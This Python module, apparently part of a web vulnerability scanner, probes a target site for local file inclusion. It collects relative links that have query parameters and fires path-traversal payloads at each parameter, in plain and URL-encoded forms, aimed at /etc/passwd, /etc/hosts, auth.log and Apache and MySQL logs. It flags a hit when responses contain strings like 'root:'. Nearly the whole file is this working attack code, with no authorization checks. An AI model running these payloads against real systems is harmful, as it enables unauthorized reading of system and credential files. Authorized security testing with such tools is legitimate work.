import requests
from bs4 import BeautifulSoup
from ...handler.retry.retryrequest import RetryRequest
from ...config import Config
from messages import SuccessMessages, ErrorMessages
from concurrent.futures import ThreadPoolExecutor
import logging

retry_request = RetryRequest(max_retries=3)
CONFIG = Config()

org_url = set()

def detect_lfi(url):
    lfi_payloads = [
        "../../../../etc/passwd", "../../../../etc/hosts", "../../../../etc/hostname",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd", "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fhosts", "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fhostname",
        "../../../../var/log/apache2/access.log", "../../../../var/log/apache2/error.log", "../../../../var/log/auth.log",
        "../../../../var/log/mysql/error.log", "../../../../var/log/mysql/mysql.log", "../../../../var/log/mysql/mysql-slow.log",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fvar%2flog%2fapache2%2faccess.log", "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fvar%2flog%2fapache2%2ferror.log",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fvar%2flog%2fauth.log", "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fvar%2flog%2fmysql%2ferror.log",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fvar%2flog%2fmysql%2fmysql.log", "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fvar%2flog%2fmysql%2fmysql-slow.log"
    ]
    response = retry_request.retry(requests.get, url, timeout=CONFIG.timeouts(), headers={'User-Agent': CONFIG.useragent()})
    soup = BeautifulSoup(response.text, 'html.parser')
    links = [link.get('href') for link in soup.find_all('a') if link.get('href') and not link.get('href').startswith(('http', 'https')) and '?' in link.get('href') and '=' in link.get('href')]
    futures = []
    with ThreadPoolExecutor(max_workers=CONFIG.threads()) as executor:
        for link in links:
            base_url, query_param = link.split('?', 1)
            param_name, _ = query_param.split('=', 1)
            futures += [executor.submit(test_lfi, url, base_url, param_name, payload) for payload in lfi_payloads]
 

def test_lfi(url, base_url, param_name, payload):
    if not f"{url}{base_url}?{param_name}={payload}" in org_url:
        org_url.add(f"{url}{base_url}?{param_name}")
        try:
            full_url = f'{url}{base_url}?{param_name}={payload}'
            response = retry_request.retry(requests.get, full_url, timeout=CONFIG.timeouts(), headers={'User-Agent': CONFIG.useragent()})
            if any(indicator in response.text for indicator in ['root:', 'bin/bash', 'usr/bin']):
                print(f"{SuccessMessages.FOUND_LFI} {full_url}")
        
        except Exception as e:
            return f"Error: {e}"

